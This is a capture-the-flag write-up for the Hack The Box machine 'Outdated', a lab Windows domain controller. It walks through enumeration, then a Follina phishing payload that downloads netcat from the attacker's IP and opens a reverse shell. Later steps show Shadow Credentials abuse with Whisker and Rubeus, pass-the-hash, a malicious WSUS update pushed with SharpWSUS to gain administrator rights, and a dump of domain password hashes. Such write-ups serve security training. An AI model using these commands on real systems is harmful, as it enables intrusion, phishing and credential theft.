# Outdated

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.193.194
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 13:54 EDT
Nmap scan report for 10.129.193.194
Host is up (0.012s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8530/tcp  open  unknown
8531/tcp  open  unknown
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49691/tcp open  unknown
49693/tcp open  unknown
49950/tcp open  unknown
49961/tcp open  unknown
59064/tcp open  unknown
```

### SMB Enumeration

Using `guest` credentials, we can find some shares:

```
$ smbmap -u 'guest' -p '' -H 10.129.193.194
[+] IP: 10.129.193.194:445      Name: 10.129.193.194                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        UpdateServicesPackages                                  NO ACCESS       A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent                                             NO ACCESS       A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.
```

Also, we know that this is a WSUS machine. The `Shares` share has a single PDF:

```
$ smbclient //10.129.193.194/Shares -N           
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 20 11:01:33 2022
  ..                                  D        0  Mon Jun 20 11:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022
```

When we view the PDF, it talks about how the systems are vulnerable to some CVEs, and that we have to send an email to `itsupport@outdated.htb` for it.&#x20;

<figure><img src="../../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>

We have to sent a link to web applications, meaning someone will click on our links. We can start with researching the vulnerabilities listed in the PDF. The first CVE (also known as Follina) is an RCE vulnerability that makes use of a HTML file that the user has to click to execute arbitrary code.&#x20;

This looks like the one that we need. I used this PoC below:

{% embed url="https://github.com/chvancooten/follina.py" %}

All we have to do is create a `docs` file that runs a command to give us a reverse shell:

```
$ python3 follina.py -t docx -m command -c "IWR http://10.10.14.13:8000/nc64.exe -outfile C:\\windows\\tasks\\nc.exe; C:\\windows\\tasks\\nc.exe -e cmd.exe 10.10.14.13 4444"
Generated 'clickme.docx' in current directory
Generated 'exploit.html' in 'www' directory
Serving payload on http://localhost:80/exploit.html
```

Then, we need to send an email to the user:

```
$ swaks --to itsupport@outdated.htb --from "test@test.com" --header "Subject: Web App" --body "http://10.10.14.13/exploit.html"
```

After waiting for a little bit, we should get a hit on both HTTP servers (one for exploit, one for

`nc.exe`) and get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (3431).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We can't grab the user flag yet, so let's look around.&#x20;

### Shadow Credentials&#x20;

We didn't have much privileges or access to files on the machine, so let's use Bloodhound to map the domain out and view the privileges that we have. In this case, we have to download `SharpHound.exe` onto the machine and get the files:

```
C:\Users\btables>.\SharpHound.exe
C:\Users\btables>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9EA0-5B4E

 Directory of C:\Users\btables

05/11/2023  02:11 AM    <DIR>          .
05/11/2023  02:11 AM    <DIR>          ..
05/11/2023  02:11 AM            11,682 20230511021146_BloodHound.zip
```

Then we just need to transfer this file over to our machine via `copy`. Afterwards, start `neo4j` and `bloodhound`, then upload the data. We can find the privilege escalation vector here:

<figure><img src="../../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

The `AddKeyCredentialLink` is exploitable using Shadow Credentials.&#x20;

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials" %}

We have to download `whisker.exe` onto the machine. First, we can compile it in VS Code 2022 using a Windows machine. Then we can download this back to our Kali machine and put it on the machine.&#x20;

Then run this:

```
.\Whisker.exe add /target:sflowers /domain:outdated.htb /dc:dc.outdated.htb
```

This should output a huge command for `Rubeus.exe`.

<figure><img src="../../../.gitbook/assets/image (854).png" alt=""><figcaption></figcaption></figure>

Download and run `Rubeus.exe` with that command, and we should get a hash to use:

<figure><img src="../../../.gitbook/assets/image (2372).png" alt=""><figcaption></figcaption></figure>

Using that NTLM hash, we can PTH and `evil-winrm` in.

<figure><img src="../../../.gitbook/assets/image (1628).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

### WSUS Admins

When we enumerate the groups we are in, we find that we are within the `WSUS Admins` group:

```
*Evil-WinRM* PS C:\Users\sflowers\desktop> net user sflowers
User name                    sflowers
Full Name                    Susan Flowers
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2022 11:04:09 AM
Password expires             Never
Password changeable          6/21/2022 11:04:09 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/11/2023 2:39:59 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*WSUS Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

For this, we can use SharpWSUS to enumerate and exploit anything:

{% embed url="https://labs.nettitude.com/blog/introducing-sharpwsus/" %}

Also, rather interestingly, we have `PsExec64.exe` within the user's desktop:

```
*Evil-WinRM* PS C:\Users\sflowers\desktop> dir

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/3/2022   4:19 PM         514472 PsExec64.exe
-ar---        5/10/2023   3:16 PM             34 user.txt
```

I use HTB VIP, so this is not placed by another player. We might need to use this later. Anyways, we can download `SharpWSUS.exe` using these commands:

```bash
curl -s https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1 | grep FromBAsE64String | cut -d '"' -f 2 | base64 -d > SharpWSUS.gz
gunzip SharpWSUS.gz
mv SharpWSUS SharpWSUS.exe
```

We can run an `inspect` command to enumerate:

```
*Evil-WinRM* PS C:\Users\sflowers\desktop> .\SharpWSUS.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.outdated.htb, 172.16.20.1, 10.0.17763.1432, 5/10/2023 10:17:06 PM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete
```

Then, we can run this command that uses `PsExec.exe` to add ourselves into the administrator group.

{% code overflow="wrap" %}
```
*Evil-WinRM* PS C:\Users\sflowers\desktop> cmd.exe /c 'SharpWSUS.exe create /payload:"C:\Users\sflowers\desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \" net localgroup administrators sflowers /add\"" /title:"update"'
[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PsExec64.exe
[*] Payload Path: C:\Users\sflowers\desktop\PsExec64.exe
[*] Arguments: -accepteula -s -d cmd.exe /c " net localgroup administrators sflowers /add"
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;quot; net localgroup administrators sflowers /add&amp;quot;

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:3d6e513b-b00f-4ca9-941f-038f045e8b15 /computername:Target.FQDN /groupname:"Group Name"

*Evil-WinRM* PS C:\Users\sflowers\desktop> .\SharpWSUS.exe approve /updateid:3d6e513b-b00f-4ca9-941f-038f045e8b15 /computername:dc.outdated.htb /groupname:"groupname"
```
{% endcode %}

Then we need to wait for a while until the update installs. We can check when it installs using this command:

```
.\SharpWSUS.exe check  /updateid:3d6e513b-b00f-4ca9-941f-038f045e8b15 /computername:dc.outdated.htb
```

Once installed, we will see that we are the part of the Administrators group.

<figure><img src="../../../.gitbook/assets/image (3794).png" alt=""><figcaption></figcaption></figure>

Then, all we need to do is relog in using `evil-winrm` and we can access the root flag:

<figure><img src="../../../.gitbook/assets/image (2573).png" alt=""><figcaption></figcaption></figure>

Alternatively, we can dump the hashes from the entire domain:

{% code overflow="wrap" %}
```
$ secretsdump.py outdated.htb/sflowers@10.129.193.194 -hashes ':1FCDB1F6015DCB318CC77BB2BDA14DB5'
<TRUNACTED>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:716f1ce2e2cf38ee1210cce35eb78cb6
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (834).png" alt=""><figcaption></figcaption></figure>
